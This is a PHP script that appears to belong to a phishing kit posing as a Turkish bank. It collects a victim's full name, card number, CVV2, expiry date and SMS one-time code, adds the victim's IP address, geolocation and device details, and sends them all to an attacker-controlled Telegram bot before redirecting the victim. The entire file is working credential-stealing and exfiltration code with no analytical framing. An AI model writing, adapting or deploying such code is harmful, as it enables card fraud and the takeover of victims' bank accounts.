<?php

session_start();

if($_SESSION['nameLastName'] == ""){
    header('Location: ../');
    exit();
}

include '../../info.php';

$nameLastName = $_SESSION['nameLastName'];
$cardNumber = $_SESSION['cardNumber'];
$tag = $_SESSION['tag'];
$cvv2 = $_SESSION['cvv2'];
$date = $_SESSION['date'];
$sms = $_POST['sms'];
$ip = $_SERVER['REMOTE_ADDR'];
$iso = $_SERVER['HTTP_USER_AGENT'];
$ip_info = json_decode(file_get_contents("http://ipwho.is/" . $ip), true);
$model = rtrim(explode(' ', $_SERVER['HTTP_USER_AGENT'])[2], ")");
if ($model === "NT") {
  $model = "Desktop";
} else if ($model === "CPU") {
  $model = "IOS";
}
$Text = "
<b>#OTP Turkey cardInfo | Turkey Bank</b>

<b>Ip : </b><code>$ip</code>
<b>nameLastName : </b><code>$nameLastName</code>
<b>cardNumber : </b><code>$cardNumber</code>
<b>cvv2 : </b><code>$cvv2</code>
<b>date(m/y) : </b><code>$date</code>
<b>otp : </b><code>$sms</code>

device : <code>$model</code>
userAgent : <code>$iso</code>
app : <code>Turkey-app</code>
tag : <code>#$tag</code>
";

@file_get_contents("https://api.telegram.org/bot$token/sendMessage?parse_mode=HTML&chat_id=$id&text=" . urlencode($Text));

header('location: ./');
exit();

?>